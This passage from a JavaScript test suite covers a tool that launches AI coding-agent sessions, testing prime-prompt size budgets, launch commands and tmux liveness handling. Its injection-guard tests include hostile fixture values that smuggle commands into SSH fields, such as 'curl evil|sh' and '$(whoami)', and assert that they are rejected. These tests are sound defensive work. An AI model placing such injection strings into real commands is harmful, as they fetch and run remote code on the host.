        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: true,
          featureIndexEnabled: true
        });
        fs.writeFileSync(featuresPath,
          '# Feature Index\n\n## Server / API\n\n- **Handler** — serves X. `lib/h.js`\n\n'
          + '## TODO (auto-stubbed 2026-07-02)\n\n'
          + '- **TBD** — touched in this session: `lib/a.js`. <!-- describe -->\n'
          + '- **TBD** — touched in this session: `lib/b.js`. <!-- describe -->\n');

        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(fiProject, engine);

        assert.ok(prompt.includes('## Feature Index'), 'section header present');
        assert.ok(prompt.includes('1 curated entry'), 'census counts the curated entries');
        assert.ok(prompt.includes('2 auto-stubbed awaiting graduation'), 'census names the backlog');
        // Neither curated bodies nor backlog stubs reach the prime any more —
        // that is the whole point of the demotion.
        assert.equal(prompt.includes('**Handler**'), false, 'curated bodies must not be inlined');
        assert.equal(prompt.includes('**TBD**'), false, 'TBD stubs must not reach the prime');
        assert.equal(prompt.includes('lib/a.js'), false, 'backlog paths must not reach the prime');
      });

      it('emits no pointer for a seeded stub with nothing in it yet', () => {
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: true,
          featureIndexEnabled: true
        });
        // The shape `_seedFeatureIndexFile` writes on toggle-on: headings and
        // guidance, zero entries. Pointing an agent at this says "read this
        // first" about a file with nothing to read.
        fs.writeFileSync(featuresPath,
          '# Feature Index\n\n<!-- Maintained automatically. -->\n\n## UI / Web\n\n## Server / API\n');

        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(fiProject, engine);

        assert.equal(prompt.includes('## Feature Index'), false,
          'an index with no entries produces no section at all');
        assert.equal(prompt.includes('0 curated'), false,
          'and certainly never instructs the agent to go read zero entries');
      });

      it('pluralizes the census for a single curated entry', () => {
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: true,
          featureIndexEnabled: true
        });
        fs.writeFileSync(featuresPath,
          '# Feature Index\n\n## Server / API\n\n- **Only** — one thing. `lib/o.js`\n');

        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(fiProject, engine);
        assert.ok(prompt.includes('1 curated entry.'), 'singular entry, and no backlog clause');
        assert.equal(prompt.includes('awaiting graduation'), false,
          'the backlog clause is omitted when there is no backlog');
      });

      it('is skipped when featureIndexEnabled is false (even with silentPrime + capability)', () => {
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: true,
          featureIndexEnabled: false
        });
        fs.writeFileSync(featuresPath, '# Feature Index\n\n- entry\n');

        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(fiProject, engine);

        assert.equal(prompt.includes('## Feature Index'), false);
      });

      it('is skipped when silentPrime is false (symmetric gate — #125 ADR 0001)', () => {
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: false,
          featureIndexEnabled: true
        });
        fs.writeFileSync(featuresPath, '# Feature Index\n\n- entry\n');

        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(fiProject, engine);

        assert.equal(prompt.includes('## Feature Index'), false,
          'silentPrime=false must short-circuit even when the project toggle is on');
      });

      it('is skipped when the engine lacks supportsSilentPrime capability', () => {
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: true,
          featureIndexEnabled: true
        });
        fs.writeFileSync(featuresPath, '# Feature Index\n\n- entry\n');

        // Synthesize an engine profile that declares no silent-prime support.
        const engineWithoutCapability = {
          id: 'no-silent',
          capabilities: { supportsSilentPrime: false }
        };

        const prompt = sessions.generatePrimePrompt(fiProject, engineWithoutCapability);
        assert.equal(prompt.includes('## Feature Index'), false,
          'engine capability gate must short-circuit injection');
      });

      it('is skipped when engineProfile.capabilities is missing entirely (defensive gate)', () => {
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: true,
          featureIndexEnabled: true
        });
        fs.writeFileSync(featuresPath, '# Feature Index\n\n- entry\n');

        const prompt = sessions.generatePrimePrompt(fiProject, { id: 'no-caps' });
        assert.equal(prompt.includes('## Feature Index'), false);
      });

      it('is skipped gracefully when FEATURES.md is missing (no throw, no section)', () => {
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: true,
          featureIndexEnabled: true
        });
        // FEATURES.md intentionally absent (beforeEach removed it).
        assert.equal(fs.existsSync(featuresPath), false, 'precondition: file absent');

        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(fiProject, engine);

        assert.equal(prompt.includes('## Feature Index'), false,
          'missing FEATURES.md must skip silently — not throw and not insert an empty section');
      });

      it('is skipped when FEATURES.md is whitespace-only (no empty section in prime)', () => {
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: true,
          featureIndexEnabled: true
        });
        fs.writeFileSync(featuresPath, '   \n\n\t  \n');

        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(fiProject, engine);

        assert.equal(prompt.includes('## Feature Index'), false,
          'whitespace-only FEATURES.md should not produce an empty section');
      });

      it('keeps every directive when FEATURES.md pushes the prompt over budget', () => {
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: true,
          featureIndexEnabled: true
        });

        // A FEATURES.md large enough to exceed the prime's size budget on its
        // own. Bulk reference material must yield to the directives; the
        // directives must never yield to it.
        const huge = '# Feature Index\n\n' + ('- entry padding word '.repeat(2000)) + '\n';
        fs.writeFileSync(featuresPath, huge);

        const wrapSentinel = require('../lib/wrap-sentinel');
        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(fiProject, engine);

        // Hard precondition: if the budget is ever removed this test must fail
        // loudly, not pass silently against an unbounded prompt.
        assert.ok(Number.isFinite(sessions.PRIME_MAX_TOKENS) && sessions.PRIME_MAX_TOKENS > 0,
          'precondition: the prime size budget is a real number');

        // The load-bearing assertion. Measuring only that the prompt got SHORT
        // ENOUGH treats truncation itself as success — which is how an oversized
        // Feature Index silently ate the wrap-sentinel directive in production
        // while this test stayed green. What matters is what SURVIVED.
        assert.ok(prompt.includes('## Wrapping this session'),
          'the wrap instructions survive a Feature Index that overflows the budget');
        assert.ok(prompt.includes(wrapSentinel.SENTINEL_TOKEN),
          'the wrap sentinel token survives a Feature Index that overflows the budget');

        // A blind tail slice is never an acceptable way to meet the budget: its
        // failure mode is a prime the reader cannot tell is incomplete.
        assert.equal(prompt.includes('[Prime prompt truncated]'), false,
          'the budget is met by yielding bulk sections, not by slicing the tail');

        // The declared budget, not the fallback: this project is on the silent
        // -prime path, so the engine's 10,000 is what actually constrains it.
        const declared = sessions._resolvePrimeBudget(engine, { viaStartupHook: true });
        assert.ok(prompt.length <= declared,
          `prompt length ${prompt.length} must fit the declared budget ${declared}`);
      });

      it('bulk sections yield to a tight budget, and say so, while directives stay whole', () => {
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: true,
          featureIndexEnabled: false
        });
        store.learnings.create({
          projectId: fiProject.id,
          content: 'padding learning '.repeat(60),
          tier: 'active'
        });

        const wrapSentinel = require('../lib/wrap-sentinel');
        const base = store.engines.get('claude');
        // A budget deliberately too small for the learnings block but large
        // enough for the directives, so the yield is the only way to fit.
        const tight = {
          ...base,
          capabilities: { ...base.capabilities, startupInjection: { maxChars: 1800 } }
        };
        const prompt = sessions.generatePrimePrompt(fiProject, tight);

        assert.equal(prompt.includes('padding learning padding learning'), false,
          'the bulk learning body yields');
        assert.ok(prompt.includes('omitted here to fit the prime size budget'),
          'the omission is announced, not silent');
        assert.ok(prompt.includes('## Active Learnings'),
          'the heading stays so the reader knows something was dropped');
        assert.ok(prompt.includes(wrapSentinel.SENTINEL_TOKEN),
          'directives are never what yields');
        assert.equal(prompt.includes('[Prime prompt truncated]'), false,
          'yielding replaces slicing entirely');
        // The point of yielding is to MEET the budget. Without this the test
        // would pass on a prime that yielded and still overflowed.
        assert.ok(prompt.length <= 1800,
          `yielding must bring the prime within budget (got ${prompt.length})`);
      });

      it('warns that directives are filling the channel BEFORE anything is dropped', () => {
        const { setLevel: setLogLevel } = require('../lib/logger');
        const base = store.engines.get('claude');
        // A DEDICATED project: sibling tests seed learnings on the shared
        // fixture, and the advisory measures the non-yielding core. Sizing a
        // budget against a prompt that carries yieldable content makes this
        // test depend on which of its siblings ran first.
        const advPath = fs.mkdtempSync(path.join(os.tmpdir(), 'tc-advisory-'));
        store.projects.create({ name: 'advisory-test', path: advPath });
        store.projectConfig.save(advPath, { engine: 'claude', silentPrime: true });
        const advProject = store.projects.getByName('advisory-test');

        const bare = sessions.generatePrimePrompt(advProject, base);
        // A budget the directives fit inside, but only just. The whole value of
        // this signal is that it arrives while there is still room to act — a
        // warning that fires once content is already gone arrives too late.
        const snug = {
          ...base,
          capabilities: {
            ...base.capabilities,
            startupInjection: { maxChars: Math.ceil(bare.length / 0.84) }
          }
        };

        const logged = [];
        const originalWrite = process.stdout.write.bind(process.stdout);
        setLogLevel('warn');
        process.stdout.write = (chunk, ...rest) => { logged.push(String(chunk)); return originalWrite(chunk, ...rest); };
        let prompt;
        try {
          prompt = sessions.generatePrimePrompt(advProject, snug);
        } finally {
          process.stdout.write = originalWrite;
          setLogLevel('error');
        }

        assert.ok(logged.some((l) => l.includes('approaching the channel budget')),
          'the advisory fires');
        assert.ok(prompt.length <= snug.capabilities.startupInjection.maxChars,
          'and it fires while the prime still fits — a leading signal, not a post-mortem');
        assert.equal(prompt.includes('omitted here to fit'), false,
          'nothing has yielded yet at the moment the warning arrives');
      });

      it('the Medusa contract yields before this project\'s own bulk does', () => {
        // The scenario the contract-inside-the-loop change is FOR: medusa active
        // and yieldable sections present at the same time. Between two pieces of
        // bulk, the static protocol doc — identical for every project — gives way
        // before the project's own accumulated state.
        const medPath = fs.mkdtempSync(path.join(os.tmpdir(), 'tc-medyield-'));
        store.projects.create({ name: 'med-yield-test', path: medPath });
        store.projectConfig.save(medPath, {
          engine: 'claude', silentPrime: true, medusaEnabled: true
        });
        const medProject = store.projects.getByName('med-yield-test');
        store.learnings.create({
          projectId: medProject.id,
          content: 'project-specific learning that must outlive the contract ',
          tier: 'active'
        });

        const contractFile = path.join(medPath, 'fixture-contract.md');
        fs.writeFileSync(contractFile, '# Fixture Consumer Contract\n' + 'protocol line\n'.repeat(300));
        // Save/restore rather than delete: an unconditional delete would clear a
        // value this test never set, leaking into whatever ran before it.
        const priorContractPath = process.env.MEDUSA_CONTRACT_PATH;
        process.env.MEDUSA_CONTRACT_PATH = contractFile;
        try {
          const base = store.engines.get('claude');
          const tight = {
            ...base,
            capabilities: { ...base.capabilities, startupInjection: { maxChars: 4400 } }
          };
          const prompt = sessions.generatePrimePrompt(medProject, tight,
            { medusaWorkspaceId: 'med-yield-cafe0123' });

          assert.ok(prompt.length <= 4400,
            `the contract's yielding must bring the whole prime within budget (got ${prompt.length})`);
          // "Yielded" means gave up space and said so — either trimmed with a
          // note or reduced to its pointer. Asserting one specific branch would
          // pin the test to a budget arithmetic detail rather than the contract.
          assert.ok(
            /truncated to fit the prime size budget|Omitted to fit the prime size budget/.test(prompt),
            'the contract gave up space, and announced it');
          assert.ok(prompt.includes('project-specific learning'),
            "the project's own learnings survive a squeeze the contract can absorb");
          assert.ok(prompt.includes('`med-yield-cafe0123`'),
            'the workspace identity is a directive and never yields');
        } finally {
          if (priorContractPath === undefined) delete process.env.MEDUSA_CONTRACT_PATH;
          else process.env.MEDUSA_CONTRACT_PATH = priorContractPath;
        }
      });

      it('does not impose the startup-hook budget on the paste channel', () => {
        // silentPrime off — the prime is pasted into the terminal, which the
        // engine's startup-hook limit does not describe. Bulk context must not
        // yield to a ceiling its channel does not have.
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: false,
          featureIndexEnabled: false
        });
        store.learnings.create({
          projectId: fiProject.id,
          content: 'paste-path learning body '.repeat(40),
          tier: 'active'
        });

        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(fiProject, engine);

        assert.ok(prompt.includes('paste-path learning body'),
          'bulk context survives on a channel with no declared limit');
        assert.equal(
          sessions._resolvePrimeBudget(engine, { viaStartupHook: false }),
          sessions.PRIME_MAX_TOKENS * 4,
          'the paste channel falls back rather than inheriting the hook limit');
      });

      it('when the directives alone exceed budget, ships them whole and names the overflow', () => {
        store.projectConfig.save(fiProjectPath, {
          engine: 'claude',
          silentPrime: true,
          featureIndexEnabled: false
        });

        const wrapSentinel = require('../lib/wrap-sentinel');
        const base = store.engines.get('claude');
        // Smaller than the directive core can possibly be. Nothing may be cut:
        // a slice here would drop whichever directive sorted last, which is the
        // exact failure this replaced.
        const impossible = {
          ...base,
          capabilities: { ...base.capabilities, startupInjection: { maxChars: 200 } }
        };
        const prompt = sessions.generatePrimePrompt(fiProject, impossible);

        assert.ok(prompt.includes(wrapSentinel.SENTINEL_TOKEN),
          'the wrap sentinel survives even an impossible budget');
        assert.ok(prompt.includes('## Wrapping this session'),
          'the wrap instructions survive even an impossible budget');
        assert.ok(prompt.includes('budget of the channel'),
          'the overflow is named in the prime itself');
        assert.ok(prompt.includes('.tangleclaw/session-prime.md'),
          'the overflow notice points at the complete text on disk');
        assert.equal(prompt.includes('[Prime prompt truncated]'), false,
          'an impossible budget still never produces a blind slice');
      });

      after(() => {
        // Clean up the dedicated FI project so it does not leak into sibling
        // describe blocks that iterate all projects.
        try { fs.rmSync(featuresPath, { force: true }); } catch {}
        try { fs.rmSync(path.join(fiProjectPath, '.tangleclaw'), { recursive: true, force: true }); } catch {}
      });
    });

    describe('Project Map pointer injection (PIDX #360, #356)', () => {
      // Dedicated project so config + PROJECT-MAP.md state stays isolated.
      let pmProject;
      let pmProjectPath;
      let mapPath;

      before(() => {
        pmProjectPath = path.join(projectsDir, 'pm-prime-test');
        fs.mkdirSync(pmProjectPath, { recursive: true });
        store.projects.create({
          name: 'pm-prime-test',
          path: pmProjectPath,
          engine: 'claude'
        });
        pmProject = store.projects.getByName('pm-prime-test');
        mapPath = path.join(pmProjectPath, 'PROJECT-MAP.md');
      });

      beforeEach(() => {
        store.projectConfig.save(pmProjectPath, {
          engine: 'claude',
          silentPrime: false,
          projectMapEnabled: false
        });
        try { fs.rmSync(mapPath, { force: true }); } catch {}
      });

      it('emits a REFERENCE pointer (not the map body) when all three gates are true', () => {
        store.projectConfig.save(pmProjectPath, {
          engine: 'claude',
          silentPrime: true,
          projectMapEnabled: true
        });
        // A map whose body contains a distinctive token we can prove is NOT inlined.
        fs.writeFileSync(mapPath, '# Project Map\n\n## Structure\n\n- `lib/` — DISTINCTIVE_BODY_TOKEN\n');

        const engine = store.engines.get('claude');
        const prompt = sessions.generatePrimePrompt(pmProject, engine);

        assert.ok(prompt.includes('## Project Map'), 'prime should contain the Project Map heading');
        assert.ok(prompt.includes('PROJECT-MAP.md'), 'prime should point at the file');
        assert.ok(prompt.includes('Consult it FIRST'), 'prime should carry the go-here-first instruction');
        // Reference, not injection: the map BODY must not be inlined.
        assert.equal(prompt.includes('DISTINCTIVE_BODY_TOKEN'), false,
          'the map body must NOT be inlined into the prime (#360 reference-not-injection)');
      });

      it('is skipped when projectMapEnabled is false (even with silentPrime + capability)', () => {
        store.projectConfig.save(pmProjectPath, {
          engine: 'claude',
          silentPrime: true,
          projectMapEnabled: false
        });
        fs.writeFileSync(mapPath, '# Project Map\n\n- entry\n');

        const prompt = sessions.generatePrimePrompt(pmProject, store.engines.get('claude'));
        assert.equal(prompt.includes('## Project Map'), false);
      });

      it('is skipped when silentPrime is false (symmetric gate)', () => {
        store.projectConfig.save(pmProjectPath, {
          engine: 'claude',
          silentPrime: false,
          projectMapEnabled: true
        });
        fs.writeFileSync(mapPath, '# Project Map\n\n- entry\n');

        const prompt = sessions.generatePrimePrompt(pmProject, store.engines.get('claude'));
        assert.equal(prompt.includes('## Project Map'), false);
      });

      it('is skipped gracefully when PROJECT-MAP.md is missing (no throw, no section)', () => {
        store.projectConfig.save(pmProjectPath, {
          engine: 'claude',
          silentPrime: true,
          projectMapEnabled: true
        });
        // PROJECT-MAP.md intentionally absent (beforeEach removed it).
        const prompt = sessions.generatePrimePrompt(pmProject, store.engines.get('claude'));
        assert.equal(prompt.includes('## Project Map'), false,
          'missing PROJECT-MAP.md must skip silently — not throw and not insert an empty section');
      });

      after(() => {
        try { fs.rmSync(mapPath, { force: true }); } catch {}
        try { fs.rmSync(path.join(pmProjectPath, '.tangleclaw'), { recursive: true, force: true }); } catch {}
      });
    });
  });

  describe('_buildLaunchCommand', () => {
    let sessions;

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('builds command from engine profile', () => {
      const cmd = sessions._buildLaunchCommand({
        launch: { shellCommand: 'claude', args: ['--verbose'], env: {} }
      });
      assert.equal(cmd, 'claude --verbose');
    });

    it('handles no args', () => {
      const cmd = sessions._buildLaunchCommand({
        launch: { shellCommand: 'codex', args: [], env: {} }
      });
      assert.equal(cmd, 'codex');
    });

    it('returns undefined when no launch config', () => {
      const cmd = sessions._buildLaunchCommand({});
      assert.equal(cmd, undefined);
    });

    it('appends launch mode args when mode is specified', () => {
      const cmd = sessions._buildLaunchCommand({
        launch: { shellCommand: 'claude', args: [], env: {} },
        launchModes: {
          auto: { label: 'Auto', args: ['--permission-mode', 'auto', '--enable-auto-mode'] }
        }
      }, null, 'auto');
      assert.equal(cmd, 'claude --permission-mode auto --enable-auto-mode');
    });

    it('ignores launch mode when mode key does not exist', () => {
      const cmd = sessions._buildLaunchCommand({
        launch: { shellCommand: 'claude', args: ['--verbose'], env: {} },
        launchModes: {
          auto: { label: 'Auto', args: ['--permission-mode', 'auto'] }
        }
      }, null, 'nonexistent');
      assert.equal(cmd, 'claude --verbose');
    });

    it('ignores launch mode when engine has no launchModes', () => {
      const cmd = sessions._buildLaunchCommand({
        launch: { shellCommand: 'codex', args: [], env: {} }
      }, null, 'auto');
      assert.equal(cmd, 'codex');
    });

    it('appends mode args after static args', () => {
      const cmd = sessions._buildLaunchCommand({
        launch: { shellCommand: 'claude', args: ['--verbose'], env: {} },
        launchModes: {
          plan: { label: 'Plan', args: ['--permission-mode', 'plan'] }
        }
      }, null, 'plan');
      assert.equal(cmd, 'claude --verbose --permission-mode plan');
    });

    describe('OpenClaw launch injection guard (#316)', () => {
      const project = { engineId: 'openclaw:c1' };
      const stubConn = (over) => {
        const conn = { id: 'c1', host: '10.0.0.1', sshUser: 'admin', sshKeyPath: '/home/x/.ssh/k', cliCommand: 'openclaw-cli', ...over };
        mock.method(store.openclawConnections, 'get', () => conn);
      };
      afterEach(() => mock.restoreAll());

      it('builds a quoted ssh command for a safe connection', () => {
        stubConn();
        const cmd = sessions._buildLaunchCommand({}, project);
        // -i is now quoted (was unquoted pre-#316).
        assert.equal(cmd, 'ssh -t -i "/home/x/.ssh/k" admin@10.0.0.1 "openclaw-cli"');
      });

      it('refuses launch (undefined) on injection-shaped host/sshUser/sshKeyPath', () => {
        for (const over of [{ host: '10.0.0.1; curl evil|sh' }, { sshUser: 'a$(whoami)' }, { sshKeyPath: '/k`id`' }]) {
          stubConn(over);
          assert.equal(sessions._buildLaunchCommand({}, project), undefined, JSON.stringify(over));
          mock.restoreAll();
        }
      });

      it('refuses launch on a cliCommand that could break out of the quotes', () => {
        stubConn({ cliCommand: 'x"; curl evil|sh #' });
        assert.equal(sessions._buildLaunchCommand({}, project), undefined);
      });

      it('still allows a cliCommand with plain flags', () => {
        stubConn({ cliCommand: 'openclaw-cli --foo' });
        const cmd = sessions._buildLaunchCommand({}, project);
        assert.equal(cmd, 'ssh -t -i "/home/x/.ssh/k" admin@10.0.0.1 "openclaw-cli --foo"');
      });
    });
  });

  describe('_resolvePreKeys', () => {
    let sessions;

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('returns mode-level preKeys when mode defines them', () => {
      const result = sessions._resolvePreKeys({
        launch: { shellCommand: 'claude', args: [] },
        launchModes: {
          bypassPermissions: { label: 'Bypass', args: ['--dangerously-skip-permissions'], preKeys: ['2'], preKeyDelay: 2000 }
        }
      }, 'bypassPermissions');
      assert.deepEqual(result.preKeys, ['2']);
      assert.equal(result.preKeyDelay, 2000);
    });

    it('falls back to engine-level preKeys when mode has none', () => {
      const result = sessions._resolvePreKeys({
        launch: { shellCommand: 'codex', args: [], preKeys: ['Enter', 'Enter'], preKeyDelay: 3000 },
        launchModes: {
          default: { label: 'Interactive', args: [] }
        }
      }, 'default');
      assert.deepEqual(result.preKeys, ['Enter', 'Enter']);
      assert.equal(result.preKeyDelay, 3000);
    });

    it('falls back to engine-level preKeys when launchMode is null', () => {
      const result = sessions._resolvePreKeys({
        launch: { shellCommand: 'codex', args: [], preKeys: ['Enter'], preKeyDelay: 2500 }
      }, null);
      assert.deepEqual(result.preKeys, ['Enter']);
      assert.equal(result.preKeyDelay, 2500);
    });

    it('returns null preKeys when neither mode nor engine define them', () => {
      const result = sessions._resolvePreKeys({
        launch: { shellCommand: 'claude', args: [] },
        launchModes: {
          default: { label: 'Interactive', args: [] }
        }
      }, 'default');
      assert.equal(result.preKeys, null);
      assert.equal(result.preKeyDelay, 0);
    });

    it('returns null preKeys for engine with no launch config', () => {
      const result = sessions._resolvePreKeys({}, null);
      assert.equal(result.preKeys, null);
      assert.equal(result.preKeyDelay, 0);
    });

    it('uses mode preKeyDelay over engine preKeyDelay', () => {
      const result = sessions._resolvePreKeys({
        launch: { shellCommand: 'claude', args: [], preKeyDelay: 1000 },
        launchModes: {
          bypassPermissions: { label: 'Bypass', args: [], preKeys: ['2'], preKeyDelay: 3000 }
        }
      }, 'bypassPermissions');
      assert.equal(result.preKeyDelay, 3000);
    });

    it('falls back to engine preKeyDelay when mode omits it', () => {
      const result = sessions._resolvePreKeys({
        launch: { shellCommand: 'claude', args: [], preKeyDelay: 1500 },
        launchModes: {
          bypassPermissions: { label: 'Bypass', args: [], preKeys: ['2'] }
        }
      }, 'bypassPermissions');
      assert.equal(result.preKeyDelay, 1500);
    });

    it('defaults preKeyDelay to 2000 when neither mode nor engine specify it', () => {
      const result = sessions._resolvePreKeys({
        launch: { shellCommand: 'claude', args: [] },
        launchModes: {
          bypassPermissions: { label: 'Bypass', args: [], preKeys: ['2'] }
        }
      }, 'bypassPermissions');
      assert.equal(result.preKeyDelay, 2000);
    });

    it('ignores mode preKeys for nonexistent mode key', () => {
      const result = sessions._resolvePreKeys({
        launch: { shellCommand: 'claude', args: [], preKeys: ['Enter'] },
        launchModes: {
          bypassPermissions: { label: 'Bypass', args: [], preKeys: ['2'] }
        }
      }, 'nonexistent');
      assert.deepEqual(result.preKeys, ['Enter']);
    });

    it('skips empty preKeys arrays', () => {
      const result = sessions._resolvePreKeys({
        launch: { shellCommand: 'claude', args: [], preKeys: ['Enter'] },
        launchModes: {
          default: { label: 'Interactive', args: [], preKeys: [] }
        }
      }, 'default');
      // Empty mode preKeys should fall through to engine-level
      assert.deepEqual(result.preKeys, ['Enter']);
    });
  });

  describe('detectIdle', () => {
    let sessions;

    before(() => {
      sessions = require('../lib/sessions');
    });

    it('returns not idle when no cached output', () => {
      sessions.clearIdleCache('nonexistent-session');
      const result = sessions.detectIdle('nonexistent-session');
      // tmux.capturePane will fail for nonexistent session, returning idle: false
      assert.equal(result.idle, false);
    });
  });

  // A status READ that writes. `hasSession` answers false both for a pane that
  // is gone and for a tmux server too wedged to reply, and this path persisted
  // that answer — so one poll from an open session page during a wedge marked a
  // running session crashed, permanently: the row does not come back when tmux
  // recovers (#900).
  //
  // The verdict is injected here because the subject is what the branch DOES
  // with it. That the verdict itself is produced correctly — a killed probe
  // reporting `answered: false` — is pinned in `test/tmux.test.js` against a
  // real stalling `tmux` on PATH, which is the only place a stub would lie.
  describe('a session whose liveness tmux could not report is not recorded as crashed (#900)', () => {
    let sessions;
    const tmux = require('../lib/tmux');
    let projectId;

    before(() => {
      sessions = require('../lib/sessions');
      const projDir = path.join(projectsDir, 'wedge-status');
      fs.mkdirSync(projDir, { recursive: true });
      projectId = store.projects.create({
        name: 'wedge-status', path: projDir, engine: 'claude'
      }).id;
    });

    /**
     * Run `fn` with `tmux.probeSession` answering `verdict`.
     * @param {object} verdict - `{live, answered, cause}`.
     * @param {Function} fn - Test body.
     * @returns {any}
     */
    function withProbe(verdict, fn) {
      const real = tmux.probeSession;
      tmux.probeSession = () => verdict;
      try {
        return fn();
      } finally {
        tmux.probeSession = real;
      }
    }

    it('leaves the record alone when tmux did not answer', () => {
      const session = store.sessions.start({
        projectId, engineId: 'claude', tmuxSession: 'tc-wedge-status'
      });
      try {
        // THE MUTATION THIS CATCHES: marking crashed on `!live` alone — which is
        // what `!tmux.hasSession(...)` meant here, and what shipped.
        withProbe({ live: false, answered: false, cause: 'read-timed-out' },
          () => sessions.getSessionStatus('wedge-status'));

        assert.equal(store.sessions.get(session.id).status, 'active',
          'a death nobody observed must not be written to the database');
      } finally {
        if (store.sessions.get(session.id).status === 'active') {
          store.sessions.kill(session.id, 'test cleanup');
        }
      }
    });

    it('still records a crash when tmux DID answer that the pane is gone', () => {
      const session = store.sessions.start({
        projectId, engineId: 'claude', tmuxSession: 'tc-wedge-status-dead'
      });
      try {
        // The other half, and the one that keeps the fix from being a blanket
        // "never mark crashed": an observed death is still recorded, or a real
        // crash would leave the session page waiting forever.
        withProbe({ live: false, answered: true, cause: null },
          () => sessions.getSessionStatus('wedge-status'));

        assert.equal(store.sessions.get(session.id).status, 'crashed');
      } finally {
        if (store.sessions.get(session.id).status === 'active') {
          store.sessions.kill(session.id, 'test cleanup');
        }
      }
    });

    it('refuses to launch over a session it cannot see, rather than clearing it', () => {
      const session = store.sessions.start({
        projectId, engineId: 'claude', tmuxSession: 'tc-wedge-status-launch'
      });
      // Booby-trapped, because the failure mode of this guard is not a wrong
      // assertion — it is a REAL `tmux new-session` starting a real agent that
      // outlives the run (#902). Reaching this line means the refusal did not
      // fire, and the test must say so loudly rather than launch.
      const realCreate = tmux.createSession;
      tmux.createSession = () => {
        throw new Error('launchSession must refuse before creating a session');
      };
      try {
        const result = withProbe({ live: false, answered: false, cause: 'read-timed-out' },
          () => sessions.launchSession('wedge-status'));

        assert.equal(result.session, null);
        assert.match(result.error, /could not determine/i,
          'the refusal has to say what it could not establish, not "already active"');
        assert.equal(store.sessions.get(session.id).status, 'active',
          'and it must not clear the record on its way out');
      } finally {
        tmux.createSession = realCreate;
        if (store.sessions.get(session.id).status === 'active') {
          store.sessions.kill(session.id, 'test cleanup');
        }
      }
    });
  });

  // The session page polls this route continuously, so the "could not
  // establish" line above is emitted at the POLL's cadence rather than the
  // condition's — the same flood the tmux listing produced, one surface over.
  // The mechanism is shared (`lib/condition-log.js`); what is specific here is
  // the key, and getting the key wrong is how the fix breaks quietly.
  describe('an unreachable pane reports at the condition\'s cadence, not the poll\'s', () => {
    let sessions;
    const tmux = require('../lib/tmux');
    const { setConsoleStream, setLevel } = require('../lib/logger');
    let projectId;

    before(() => {
      sessions = require('../lib/sessions');
      const projDir = path.join(projectsDir, 'cadence-status');
      fs.mkdirSync(projDir, { recursive: true });
      projectId = store.projects.create({
        name: 'cadence-status', path: projDir, engine: 'claude'
      }).id;
    });

    /**
     * Poll `getSessionStatus` with a fixed probe verdict, capturing the log.
     * @param {object[]} verdicts - One verdict per poll, applied in order.
     * @returns {string[]} Captured log lines.
     */
    function poll(verdicts) {
      const realProbe = tmux.probeSession;
      const lines = [];
      setConsoleStream({ write: (s) => lines.push(s) });
      setLevel('debug');
      try {
        for (const v of verdicts) {
          tmux.probeSession = () => v;
          sessions.getSessionStatus('cadence-status');
        }
      } finally {
        tmux.probeSession = realProbe;
        setConsoleStream(null);
        setLevel('info');
      }
      return lines;
    }

    const UNREACHABLE = { live: false, answered: false, cause: 'read-timed-out' };
    const ALIVE = { live: true, answered: true, cause: null };
    const MSG = /Could not establish whether this session is still live/;

    /**
     * Count captured lines at a level whose message matches.
     * @param {string[]} lines - Captured output.
     * @param {string} level - `WARN` or `DEBUG`.
     * @returns {number}
     */
    const count = (lines, level) =>
      lines.filter((l) => l.includes(`[${level}]`) && MSG.test(l)).length;

    it('warns once for a pane that stays unreachable across polls', () => {
      // THE MUTATION THIS CATCHES: reporting on every poll, which is what
      // shipped — an open session page turned one wedged pane into a warning
      // every few seconds for as long as the tab was open.
      const session = store.sessions.start({
        projectId, engineId: 'claude', tmuxSession: 'tc-cadence-a'
      });
      try {
        const lines = poll([UNREACHABLE, UNREACHABLE, UNREACHABLE]);
        assert.equal(count(lines, 'WARN'), 1, 'one condition, one warning');
        assert.equal(count(lines, 'DEBUG'), 2, 'the repeats stay as evidence');
      } finally {
        store.sessions.kill(session.id, 'test cleanup');
      }
    });

    it('warns again after the pane answers and then goes quiet a second time', () => {
      // THE MUTATION THIS CATCHES: re-arming only on the reachable branch, or
      // not at all. A pane that recovers and wedges again is a new incident.
      const session = store.sessions.start({
        projectId, engineId: 'claude', tmuxSession: 'tc-cadence-b'
      });
      try {
        const lines = poll([UNREACHABLE, ALIVE, UNREACHABLE]);
        assert.equal(count(lines, 'WARN'), 2,
          'two silences separated by an answer are two incidents');
      } finally {
        store.sessions.kill(session.id, 'test cleanup');
      }
    });

    it('does not let one unreachable pane silence the first report about another', () => {
      // THE MUTATION THIS CATCHES: keying the condition globally (one tmux
      // server, one key) instead of per session. That key is right for the
      // LISTING, which asks one question about the server, and wrong here,
      // where each poll asks about a specific pane — a global key would report
      // the first wedged pane and then say nothing about any other, which is
      // worse than the flood it replaced because it hides a real second fault.
      const a = store.sessions.start({
        projectId, engineId: 'claude', tmuxSession: 'tc-cadence-c'
      });
      const projDir2 = path.join(projectsDir, 'cadence-status-2');
      fs.mkdirSync(projDir2, { recursive: true });
      const project2 = store.projects.create({
        name: 'cadence-status-2', path: projDir2, engine: 'claude'
      });
